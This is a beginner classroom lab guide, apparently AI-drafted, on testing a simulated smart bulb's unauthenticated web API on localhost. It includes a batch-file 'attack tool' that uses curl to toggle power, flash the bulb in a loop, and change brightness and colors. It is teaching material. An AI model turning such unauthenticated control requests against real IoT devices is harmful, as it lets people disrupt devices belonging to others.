# Smart Bulb Security Analysis
## Hands-on Laboratory Activity Guide

### Activity Overview
**Duration:** 1 hour
**Level:** Beginner
**Format:** Guided hands-on exercise

### Learning Objectives
After completing this activity, students will be able to:
1. Understand basic IoT device functionality
2. Identify common IoT security vulnerabilities
3. Execute basic security tests
4. Observe real-time attack impacts
5. Understand the importance of IoT security

### Required Materials
- Computer with Windows OS
- Internet connection
- Web browser
- Command Prompt/PowerShell
- Text editor (Notepad or similar)

### Pre-lab Setup (Instructor)
1. Verify Python installation on all computers
2. Install required packages
3. Set up the smart bulb simulator
4. Test all commands beforehand

### Activity Instructions

#### Part 1: Understanding the Smart Bulb Interface
**Time: 10 minutes**

1. **Access the Smart Bulb**
```bash
# Open web browser and navigate to:
http://localhost:8080
```

2. **Basic Interface Testing**
- [ ] Click the power button to turn the bulb on/off
- [ ] Move the brightness slider
- [ ] Use the color picker to change colors
- [ ] Note the device information displayed

3. **Record Observations**
```
Questions to Answer:
1. What information can you see about the device?
2. What controls are available?
3. Was any password required to access the device?
```

#### Part 2: Basic Security Testing
**Time: 15 minutes**

1. **Check Device Status**
```bash
# Open Command Prompt and type:
curl http://localhost:8080/api/status
```
- [ ] Record the information received
- [ ] Note any sensitive data exposed

2. **Control Testing**
```bash
# Turn the bulb on
curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": true}"

# Turn the bulb off
curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": false}"
```
- [ ] Did the commands work?
- [ ] What happened on the web interface?

#### Part 3: Attack Simulation
**Time: 20 minutes**

1. **Create Attack Script**
```bash
# Create a new file called attack.bat
notepad attack.bat
```

2. **Copy this code:**
```batch
@echo off
:menu
cls
echo Smart Bulb Attack Tool
echo ====================
echo 1. Turn Bulb ON
echo 2. Turn Bulb OFF
echo 3. Flash Attack
echo 4. Maximum Brightness
echo 5. Color Change Attack
echo 6. Exit

set /p choice="Select attack (1-6): "

if "%choice%"=="1" (
    echo Executing Power ON Attack...
    curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": true}"
)
if "%choice%"=="2" (
    echo Executing Power OFF Attack...
    curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": false}"
)
if "%choice%"=="3" (
    echo Starting Flash Attack (Press Ctrl+C to stop)...
    :flash
    curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": true}"
    timeout /t 1
    curl -X POST http://localhost:8080/api/control/power -H "Content-Type: application/json" -d "{\"state\": false}"
    timeout /t 1
    goto flash
)
if "%choice%"=="4" (
    echo Setting Maximum Brightness...
    curl -X POST http://localhost:8080/api/control/brightness -H "Content-Type: application/json" -d "{\"brightness\": 100}"
)
if "%choice%"=="5" (
    echo Changing Colors Rapidly...
    curl -X POST http://localhost:8080/api/control/color -H "Content-Type: application/json" -d "{\"color\": \"#FF0000\"}"
    timeout /t 1
    curl -X POST http://localhost:8080/api/control/color -H "Content-Type: application/json" -d "{\"color\": \"#00FF00\"}"
    timeout /t 1
    curl -X POST http://localhost:8080/api/control/color -H "Content-Type: application/json" -d "{\"color\": \"#0000FF\"}"
)
if "%choice%"=="6" (
    exit
)

timeout /t 3
goto menu
```

3. **Run Attacks**
```bash
# Run the attack script
attack.bat
```
- [ ] Try each attack option
- [ ] Observe the effects on the web interface
- [ ] Note any attack alerts or warnings

#### Part 4: Analysis and Documentation
**Time: 15 minutes**

Complete the following worksheet:

```
Security Analysis Worksheet

1. Device Information
   - Device ID: _____________
   - Firmware Version: _____________
   - Available Controls: _____________

2. Vulnerability Assessment
   a. List three security problems you found:
      1. ____________________
      2. ____________________
      3. ____________________

   b. For each attack you performed, describe the impact:
      Power Attack: ____________________
      Flash Attack: ____________________
      Color Attack: ____________________

3. Security Implications
   a. What could happen if this was a real device?
      ____________________
   b. How could these attacks affect users?
      ____________________

4. Suggested Improvements
   List three ways to make the device more secure:
   1. ____________________
   2. ____________________
   3. ____________________
```

### Activity Deliverables
Students should submit:
1. Completed Security Analysis Worksheet
2. Screenshots of attack results
3. Brief explanation of findings (2-3 paragraphs)

### Grading Rubric (100 points)

1. **Basic Testing (20 points)**
- Successfully accessed interface (5)
- Completed basic controls testing (5)
- Documented initial observations (10)

2. **Command Execution (25 points)**
- Successfully ran status check (5)
- Executed control commands (10)
- Documented command results (10)

3. **Attack Implementation (30 points)**
- Created attack script (10)
- Executed different attacks (10)
- Documented attack effects (10)

4. **Analysis & Documentation (25 points)**
- Identified vulnerabilities (10)
- Analyzed security implications (10)
- Suggested improvements (5)

### Safety Notes
- This activity is for educational purposes only
- Do not attempt these techniques on real devices
- Follow instructor guidance
- Report any issues immediately

### Additional Challenges (Optional)
1. Create a new type of attack
2. Modify the attack script to add features
3. Design a protection mechanism
4. Research real IoT vulnerabilities

### Instructor Notes

1. **Setup Verification**
```bash
# Before class, verify:
python --version
pip install flask flask-socketio
python app.py  # Should start without errors
```

2. **Common Issues**
- Port already in use (change port in code)
- Missing Python packages
- Command syntax errors
- WebSocket connection issues

3. **Discussion Points**
- Real-world implications
- Similar vulnerabilities in actual devices
- Importance of security testing
- Professional ethics

Would you like me to:
1. Add more detailed instructions for any section?
2. Include additional attack scenarios?
3. Create a more detailed grading rubric?
4. Add troubleshooting guidelines?